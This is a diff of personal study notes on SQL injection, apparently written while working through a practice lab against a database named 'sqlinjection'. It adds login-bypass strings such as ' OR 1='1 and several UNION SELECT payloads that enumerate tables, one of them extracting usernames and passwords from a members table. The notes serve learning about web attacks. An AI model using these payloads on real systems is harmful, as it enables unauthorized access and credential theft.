@@ -1069,7 +1069,7 @@ Access to CREDENTIALS
 username: ' OR 1='1
 password: ' OR 1='1
 
-
+GET OR 1=1
 
 inspect -> network tab -> send login again
 
@@ -1237,17 +1237,17 @@ What are information_schema and database()?
 
 
 
+UNION SELECT id,date,member from sqlinjection.orders where id = "1337"
 
+UNION SELECT id,comment,mime from sqlinjection.shares4 where id = "1337"
 
+UNION SELECT id,name,description from sqlinjection.products where id = "1337"
 
+UNION SELECT id,name,description from sqlinjection.categories where id = "1337"
 
+UNION SELECT id,username,password from sqlinjection.members where id = "1337"
 
-
-
-
-
-
-
+UNION SELECT id,quantity,product from sqlinjection.orderlines where id = "1337"
 
 
 
